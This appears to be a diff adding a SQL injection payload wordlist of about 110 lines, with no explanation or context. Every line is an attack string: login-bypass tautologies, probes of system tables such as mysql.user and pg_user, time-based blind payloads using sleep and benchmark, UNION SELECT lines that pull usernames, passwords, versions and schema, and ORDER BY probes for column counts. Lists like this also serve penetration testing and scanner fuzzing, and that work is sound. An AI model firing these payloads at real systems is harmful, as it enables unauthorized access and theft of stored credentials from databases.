@@ -1,0 +1,110 @@
+' or '1'='1
+' or ''=''
+' or 'a'='a
+' or 'admin'='admin
+' or 'password'='password
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+admin' --
+admin' #
+admin'/*
+' or '1'='1' --
+' or '1'='1' #
+' or '1'='1' /*
+' or 'text'='text
+' or 'x'='x
+' or 'test'='test
+' or 'pass'='pass
+' or '123'='123
+' or 'abc'='abc
+' or 'qwerty'='qwerty
+' or 'letmein'='letmein
+' or 'welcome'='welcome
+' or 'login'='login
+' or 'user'='user
+' or 'root'='root
+' or 'guest'='guest
+' or 1=convert(int, '@@version') --
+' or exists(select 1)--
+' or exists(select * from users)--
+' or exists(select username from users)--
+' or exists(select password from users)--
+' or exists(select * from information_schema.tables)--
+' or exists(select * from mysql.user)--
+' or exists(select * from pg_user)--
+' or exists(select * from sqlite_master)--
+' or length(database())>0 --
+' or length(user())>0 --
+' or (select count(*) from users) > 0 --
+admin' or '1'='1
+admin' or 1=1 --
+admin' or 1=1 #
+admin' or 1=1 /*
+password' or '1'='1 --
+password' or '1'='1 #
+password' or '1'='1 /*
+password' or 1=1 --
+password' or 1=1 #
+password' or 1=1 /*
+123456' or '1'='1 --
+123456' or '1'='1 #
+123456' or '1'='1 /*
+password123' or '1'='1 --
+password123' or '1'='1 #
+password123' or '1'='1 /*
+' or sleep(5)--
+' or sleep(10)--
+' or benchmark(1000000, md5('0'))--
+' or benchmark(1000000, sha1('0'))--
+' or benchmark(1000000, sha256('0'))--
+' or benchmark(1000000, sha512('0'))--
+' or '1'='1' union select 1,2,3 --
+' or '1'='1' union select null, null, null --
+' or '1'='1' union select username, password from users --
+' or '1'='1' union select table_name, column_name from information_schema.columns --
+' or '1'='1' union select schema_name from information_schema.schemata --
+' or '1'='1' union select version() --
+' or '1'='1' union select database() --
+' or '1'='1' union select user() --
+' or '1'='1' union select @@hostname --
+' or '1'='1' union select @@version --
+' or '1'='1' union select 1, version(), current_user() --
+' or '1'='1' union select 1, database(), user() --
+' or '1'='1' union select 1, table_name from information_schema.tables --
+' or '1'='1' union select 1, column_name from information_schema.columns where table_name='users' --
+' or '1'='1' union select username, password from mysql.user --
+' or '1'='1' union select name, sql from sqlite_master --
+' or '1'='1' order by 1 --
+' or '1'='1' order by 2 --
+' or '1'='1' order by 3 --
+' or '1'='1' order by 4 --
+' or '1'='1' order by 5 --
+' or '1'='1' order by 10 --
+' or '1'='1' group by 1 --
+' or '1'='1' group by 2 --
+' or '1'='1' group by 3 --
+' or '1'='1' group by 4 --
+' or '1'='1' group by 5 --
+' or '1'='1' having 1=1 --
+' or '1'='1' having 2=2 --
+' or '1'='1' having 3=3 --
+' or '1'='1' having 4=4 --
+' or '1'='1' having 5=5 --
+' or '1'='1' and 1=1 --
+' or '1'='1' and 2=2 --
+' or '1'='1' and 3=3 --
+' or '1'='1' and 4=4 --
+' or '1'='1' and 5=5 --
+' or 1=1--
+' or '1'='1' or '123'='123
+' or '1'='1' or 'test123'='test123
+' or '1'='1' or 'admin123'='admin123
+' or '1'='1' or 'password1'='password1
+' or '1'='1' or 'password1234'='password1234
+' or '1'='1' or 'letme1n'='letme1n
+' or '1'='1' or 'welcome123'='welcome123
+' or '1'='1' or 'login123'='login123
+' or '1'='1' or 'user123'='user123
+' or '1'='1' or 'guest123'='guest123
+' or '1'='1' or 'root123'='root123
